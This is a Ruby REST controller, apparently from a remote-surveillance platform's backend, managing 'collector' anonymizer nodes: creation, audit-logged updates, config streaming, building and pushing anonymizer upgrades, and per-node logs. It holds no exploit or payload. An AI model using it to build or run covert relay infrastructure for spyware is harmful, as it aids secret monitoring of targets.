#
# Controller for the Collector objects
#


module RCS
module DB

class CollectorController < RESTController
  include Archive::Tar

  def index
    require_auth_level :server, :sys, :tech

    mongoid_query do
      result = ::Collector.all

      return ok(result)
    end
  end

  def show
    require_auth_level :sys, :tech

    mongoid_query do
      result = Collector.find(@params['_id'])
      return ok(result)
    end
  end

  def create
    require_auth_level :sys
    require_auth_level :sys_frontend

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :anonymizers

    result = Collector.create!(name: @params['name']) do |coll|
      coll[:type] = 'remote'
      coll[:address] = @params['address']
      coll[:desc] = @params['desc']
      coll[:port] = @params['port']
      coll[:poll] = @params['poll']
      coll[:configured] = false
      coll[:upgradable] = false
      coll[:next] = [nil]
      coll[:prev] = [nil]
    end

    Audit.log :actor => @session.user[:name], :action => 'collector.create', :desc => "Created the collector '#{@params['name']}'"

    return ok(result)
  end

  def update
    require_auth_level :sys
    require_auth_level :sys_frontend

    mongoid_query do
      coll = Collector.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if coll[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session.user[:name], :action => 'collector.update', :desc => "Updated '#{key}' to '#{value}' for collector '#{coll['name']}'"
        end
      end

      coll.update_attributes(@params)
      
      return ok(coll)
    end
  end
  
  def destroy
    require_auth_level :sys
    require_auth_level :sys_frontend

    mongoid_query do
      collector = Collector.find(@params['_id'])

      Audit.log :actor => @session.user[:name], :action => 'collector.destroy', :desc => "Deleted the collector '#{collector[:name]}'"

      collector.destroy
      return ok
    end    
  end

  def version
    require_auth_level :server

    mongoid_query do
      collector = Collector.find(@params['_id'])
      @params.delete('_id')
      
      collector.version = @params['version']
      collector.save
      
      return ok
    end
  end

  def config
    require_auth_level :server

    mongoid_query do
      collector = Collector.find(@params['_id'])
      return not_found if collector.configured

      # create the tar.gz with the config
      File.open(Config.instance.temp(collector._id.to_s), 'wb')  do |f|
        f.write collector.config
      end

      # reset the flag for the "configuration needed"
      collector.configured = true
      collector.save

      return stream_file(Config.instance.temp(collector._id.to_s), proc { FileUtils.rm_rf Config.instance.temp(collector._id.to_s) })
    end
  end

  def upgrade
    require_auth_level :server, :sys

    mongoid_query do
      collector = Collector.find(@params['_id'])

      case @request[:method]
        when 'GET'
          return not_found unless collector.upgradable

          raise "This anonymizer is old and cannot be ugraded" unless collector.good

          trace :info, "Upgrading #{collector.name}"

          build = Build.factory(:anon)
          build.load(nil)
          build.unpack
          build.patch({})
          build.melt({'port' => collector.port})

          collector.upgradable = false
          collector.save

          return stream_file(build.path(build.outputs.first), proc { build.clean })

        when 'POST'
          Audit.log :actor => @session.user[:name], :action => 'collector.upgrade', :desc => "Upgraded the collector '#{collector[:name]}'"

          collector.upgradable = true
          collector.save

          return server_error("Cannot push to #{collector.name}") unless Frontend.nc_push(collector.address)

          return ok
      end
    end
  end

  def log
    mongoid_query do
      collector = Collector.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :sys

          logs = CappedLog.collection_class(collector[:_id]).all.order_by([[:_id, :asc]])
          return ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new collector[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return ok
      end

      return bad_request
    end
  end

  def del_logs
    require_auth_level :sys
    require_auth_level :sys_frontend

    mongoid_query do
      collector = Collector.find(@params['_id'])

      collector.drop_log_collection

      return ok
    end
  end

end

end #DB::
end #RCS::
